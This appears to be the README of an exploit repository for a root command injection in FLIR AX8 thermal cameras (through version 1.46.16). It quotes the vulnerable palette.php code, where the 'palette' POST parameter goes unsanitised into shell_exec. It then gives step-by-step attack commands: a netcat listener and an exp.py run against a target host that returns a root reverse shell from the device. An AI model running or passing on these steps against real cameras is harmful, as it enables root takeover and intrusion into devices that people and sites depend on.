# flir_ax8_rce

All FLIR AX8 thermal sensor cameras version up to and including 1.46.16 are vulnerable to Remote Command Injection. This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter ["palette"] in the palette.php endpoint. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system with the root privileges. 

palette.php
```
<?php
	if(isset($_POST["palette"])){
		shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/palette ".$_POST["palette"]);
		echo json_encode(array("success"));
	}
?>
```

attack execute:
  ```
  nc -lp LPORT
  python3 exp.py --RHOST RHOST --RPORT RPORT --LHOST LHOST --LPORT LPORT
  ```

Then it will get the reverse shell of the device。


<img width="193" alt="1" src="https://user-images.githubusercontent.com/63924776/188060839-f4d34415-8d79-443c-bd70-c9a733eaacf4.PNG">
